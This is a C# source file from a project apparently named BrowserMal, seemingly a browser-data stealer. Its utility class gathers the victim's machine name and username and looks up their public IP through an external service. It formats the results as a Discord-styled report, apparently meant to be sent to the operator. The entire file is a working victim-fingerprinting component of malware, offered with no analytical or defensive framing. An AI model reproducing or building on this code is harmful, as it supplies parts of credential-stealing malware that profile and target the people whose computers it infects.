﻿using System;
using System.Text;

namespace BrowserMal.Util
{
    public class SystemInfo
    {
        public static string MachineName = Environment.MachineName;
        public static string UserName = Environment.UserName;

        public static string Init()
        {
            StringBuilder sb = new StringBuilder();

            sb.AppendLine($":computer: ``Machine Name:`` {MachineName}");
            sb.AppendLine($":person_curly_hair: ``Username:`` {UserName}");
            sb.AppendLine("");
            sb.AppendLine($":eyes: ``IP:`` {Web.Get("https://ip4.seeip.org/")}");
            //sb.AppendLine($":eyes: ``IPv6:`` {Web.Get("https://ip.seeip.org/")}");

            return sb.ToString();
        }
    }
}
